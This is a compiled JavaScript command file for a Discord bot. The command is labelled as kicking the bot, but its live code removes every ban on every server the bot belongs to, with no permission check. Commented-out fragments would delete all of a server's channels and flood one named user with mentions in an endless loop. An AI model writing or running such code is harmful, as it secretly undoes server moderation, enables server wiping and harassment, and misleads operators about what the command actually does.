"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const Command_1 = require("./Command");
const Main_1 = require("../Main");
class DecoCommands extends Command_1.Commands {
    constructor() {
        super("deco", "permet de kick le bot");
    }
    execute(user, message, args) {
        return __awaiter(this, void 0, void 0, function* () {
            /**
                     message.guild.channels.cache.forEach(function (channel) {
                         if (channel instanceof GuildChannel) {
                             channel.delete().then(value => console.log(value.deleted))
                         }
                    });
             */
            Main_1.default.getInstance().getClient().guilds.cache.forEach((guild) => {
                console.log(guild.bans.cache.toJSON());
                guild.bans.cache.forEach(value => {
                    guild.bans.remove(value.user, 'bonne conduit');
                    console.log(value.user.username);
                });
            });
            /*
    const member = message.guild.members.cache.find(user => user.user.username == 'HaRd' && user.id == "0084");
            while (true){
        await message.channel.send({allowedMentions:{users:member.user.username}})
            }
            */
        });
    }
}
exports.default = DecoCommands;
//# sourceMappingURL=DecoCommands.js.map